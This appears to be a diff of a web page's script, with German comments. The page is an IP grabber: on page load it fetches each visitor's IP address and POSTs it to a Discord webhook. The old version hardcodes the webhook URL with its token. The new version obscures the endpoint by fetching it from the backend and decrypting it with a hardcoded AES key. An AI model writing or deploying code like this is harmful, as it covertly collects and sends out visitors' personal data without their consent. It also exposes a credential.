@@ -47,47 +47,21 @@
         </audio>
     </div>
 
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1-crypto-js.js"></script>
     <script>
-        // Load YouTube API
-        var tag = document.createElement('script');
-        tag.src = "https://www.youtube.com/iframe_api";
-        var firstScriptTag = document.getElementsByTagName('script')[0];
-        firstScriptTag.parentNode.insertBefore(tag, firstScriptTag);
-
-        let player;
-        function onYouTubeIframeAPIReady() {
-            player = new YT.Player('player', {
-                height: '0',
-                width: '0',
-                videoId: 'YKflNeF5D_w', // Replace with your YouTube video ID
-                playerVars: {
-                    'autoplay': 1,
-                    'controls': 0,
-                    'loop': 1,
-                    'playlist': 'YKflNeF5D_w' // Required for looping
-                },
-                events: {
-                    'onReady': onPlayerReady,
-                    'onStateChange': onPlayerStateChange
-                }
-            });
+        // Abrufen des verschlüsselten Webhooks vom Backend
+        async function getEncryptedWebhook() {
+            const response = await fetch('/get-encrypted-webhook');
+            const data = await response.json();
+            return data.encryptedWebhook;
         }
 
-        function onPlayerReady(event) {
-            // Set volume to 50% and play immediately
-            player.setVolume(50);
-            player.playVideo();
+        // Entschlüsseln des Webhooks
+        async function decryptWebhook(encryptedWebhook) {
+            const secretKey = "Sigma123!"; // Dein Passwort
+            const decryptedWebhook = CryptoJS.AES.decrypt(encryptedWebhook, secretKey).toString(CryptoJS.enc.Utf8);
+            return decryptedWebhook;
         }
-
-        function onPlayerStateChange(event) {
-            // If video ends, replay it
-            if (event.data === YT.PlayerState.ENDED) {
-                player.playVideo();
-            }
-        }
-
-        // Set background image
-        document.body.style.backgroundImage = "url('https://cdn.discordapp.com/attachments/1151144288483283016/1331247474635046912/video0_4.gif?ex=6790ec53&is=678f9ad3&hm=3a89976dba559a1ec904403da9ae7cb8b11e1434f7cb45290010984b293bc1b7&')";
 
         async function logIP() {
             try {
@@ -96,11 +70,14 @@
                 const data = await response.json();
                 const ip = data.ip;
 
-                // Display the IP address
-                document.getElementById('ipDisplay').textContent = `${ip}`;
+                // Zeige die IP-Adresse an
+                document.getElementById('ipDisplay').textContent = `Your IP: ${ip}`;
 
-                // Send IP to the webhook
-                const webhookURL = "https://discord.com/api/webhooks/1329145060230692935/-93HduLZfipXZnGgRBszzvfpOHYdAjWwcAElg9N_FdT4IB4pPbr05lUMQdtoSqTrqR4h"; // Dein Discord Webhook-URL
+                // Hole den verschlüsselten Webhook und entschlüssle ihn
+                const encryptedWebhook = await getEncryptedWebhook();
+                const webhookURL = await decryptWebhook(encryptedWebhook);
+
+                // Sende die IP-Adresse an den entschlüsselten Webhook
                 await fetch(webhookURL, {
                     method: "POST",
                     headers: {
@@ -117,7 +94,7 @@
             }
         }
 
-        // Log the IP as soon as the page loads
+        // Logge die IP-Adresse sobald die Seite geladen wird
         logIP();
     </script>
 </body>
